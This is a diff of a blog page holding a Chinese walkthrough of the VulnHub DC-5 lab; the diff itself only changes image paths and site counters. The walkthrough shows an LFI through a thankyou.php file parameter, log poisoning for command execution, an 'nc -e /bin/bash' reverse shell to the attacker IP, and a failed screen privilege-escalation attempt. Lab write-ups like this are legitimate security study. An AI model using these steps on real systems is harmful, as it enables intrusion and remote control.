@@ -27,32 +27,32 @@
 <meta property="og:site_name" content="bosch">
 <meta property="og:description" content="0x001234nmap -Pn 192.168.114.0&#x2F;24nmap -A -T 4 192.168.114.146   特地查了一下rpcbind，大概是将RPC服务映射到其侦听的端口的服务，和DNS类似。 rpcbind [3]实用程序将RPC服务映射到其侦听的端口。RPC进程在启动时会通知rpcbind，注册正在侦听的端口以及期望使用的RPC程序号。然后，客户端系统使用特定的RPC程序">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/1.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/2.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/3.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/4.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/5.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/6.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/7.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/8.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/9.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/10.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/11.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/12.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/13.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/14.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/15.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/16.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/17.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/18.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/19.png">
-<meta property="og:image" content="d:/Blog/blog/source/images/DC-5/20.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/1.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/2.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/3.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/4.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/5.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/6.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/7.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/8.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/9.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/10.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/11.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/12.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/13.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/14.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/15.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/16.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/17.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/18.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/19.png">
+<meta property="og:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/20.png">
 <meta property="article:published_time" content="2020-05-13T21:36:20.000Z">
 <meta property="article:modified_time" content="2020-05-14T22:12:56.000Z">
 <meta property="article:author" content="bosch">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:/Blog/blog/source/images/DC-5/1.png">
+<meta name="twitter:image" content="https://ckcah.github.io/.io//Blog/blog/source/images/DC-5/1.png">
 
 <link rel="canonical" href="https://ckcah.github.io/2020/05/14/DC-5%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/">
 
@@ -322,44 +322,44 @@
       
         <h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.114.0/24</span><br><span class="line"></span><br><span class="line">nmap -A -T 4 192.168.114.146</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\1.png" alt="image-20200514054055039"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\1.png" alt="image-20200514054055039"></p>
 <p>特地查了一下rpcbind，大概是将RPC服务映射到其侦听的端口的服务，和DNS类似。</p>
 <p><strong>rpcbind [3]实用程序将RPC服务映射到其侦听的端口。RPC进程在启动时会通知rpcbind，注册正在侦听的端口以及期望使用的RPC程序号。然后，客户端系统使用特定的RPC程序服务器与服务器上的rpcbind联系。rpcbind服务重新设置客户端重定向到正确的端口号，刹车它可以与请求的服务进行通信</strong></p>
 <p>80端口也是打开的，先试试从80端口入手</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\2.png" alt="image-20200514054437764"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\2.png" alt="image-20200514054437764"></p>
 <p>wappalyzer只检测出它是php编写的，以及服务器是nginx。</p>
 <p>访问contact的时候，发现有一个留言功能，或许可以试试xss</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\3.png" alt="image-20200514054556665"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\3.png" alt="image-20200514054556665"></p>
 <p>burp跑了字典，不行</p>
 <p>试试跑目录，什么都没跑出来</p>
 <p>sql注入，试了几个原始头参数，没用</p>
 <p>实在没办法了，还是乖乖的去看<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/">大佬</a>文章学知识吧</p>
 <p>作者提到，当我们提交contact表单时，下边的logo会从2019变成2020</p>
 <p>未提交前：</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\4.png" alt="image-20200514064408110"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\4.png" alt="image-20200514064408110"></p>
 <p>提交后：</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\5.png" alt="image-20200514064453517"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\5.png" alt="image-20200514064453517"></p>
 <p>测试了很久发现是LFI漏洞</p>
 <p>其实首页就已经提示了是本地文件包含漏洞</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\6.png" alt="image-20200514064800357"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\6.png" alt="image-20200514064800357"></p>
 <p>用/etc/passwd测试，存在LFI漏洞</p>
 <p>按理来说，像数据库日志文件，登陆日志文件，访问日志文件，linux的话，都在/var下，那就直接去看看access文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.114.133/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\7.png" alt="image-20200514065353784"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\7.png" alt="image-20200514065353784"></p>
 <p>学到一个新知识</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\8.png" alt="image-20200514065332937"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\8.png" alt="image-20200514065332937"></p>
 <p>这样插入一句话木马的，我还是第一次见</p>
 <p>提交成功</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\9.png" alt="image-20200514065419432"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\9.png" alt="image-20200514065419432"></p>
 <p>验证一下cmd是否可以执行，给cmd一个parameter，用**&amp;cmd=id**</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\10.png" alt="image-20200514065734341"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\10.png" alt="image-20200514065734341"></p>
 <p>全局搜索一下<code>uid</code></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\11.png" alt="image-20200514065546988"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\11.png" alt="image-20200514065546988"></p>
 <p>请出<code>netcat </code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.114.1 1234</span><br><span class="line"></span><br><span class="line">192.168.114.1为攻击机IP地址</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\12.png" alt="image-20200514070835769"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\12.png" alt="image-20200514070835769"></p>
 <p>再在本地执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
 
@@ -367,9 +367,9 @@
 
 <p>奇怪的是，我在windows下怎么做都不成功</p>
 <p>所以只好切换成kali</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\13.png" alt="image-20200514071554470"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\13.png" alt="image-20200514071554470"></p>
 <p>然后</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\14.png" alt="image-20200514071803007"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\14.png" alt="image-20200514071803007"></p>
 <p>不太知道这是什么，查了下</p>
 <p><strong>2&gt;/dev/null</strong></p>
 <p>2是错误输出</p>
@@ -379,15 +379,15 @@
 <p>kali自带漏洞搜索，那就查查</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\15.png" alt="image-20200514072553731"></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\16.png" alt="image-20200514072616966"></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\17.png" alt="image-20200514072646869"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\15.png" alt="image-20200514072553731"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\16.png" alt="image-20200514072616966"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\17.png" alt="image-20200514072646869"></p>
 <p>接下来就是漏洞利用</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\18.png" alt="image-20200514072742399"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\18.png" alt="image-20200514072742399"></p>
 <p>好像不太行得通</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\19.png" alt="image-20200514073252130"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\19.png" alt="image-20200514073252130"></p>
 <p>试试另一个41154.sh</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\20.png" alt="image-20200514073444042"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\20.png" alt="image-20200514073444042"></p>
 <p>提权未成功</p>
 <p>再议</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要细心观察每一个地方的变化</p>
@@ -491,20 +491,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-count">83</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-count">53</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">57</span>
+        <span class="site-state-item-count">61</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -541,13 +541,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">291k</span>
+    <span title="Symbols count total">318k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">4:24</span>
+    <span title="Reading time total">4:49</span>
 </div>
 
 <!--
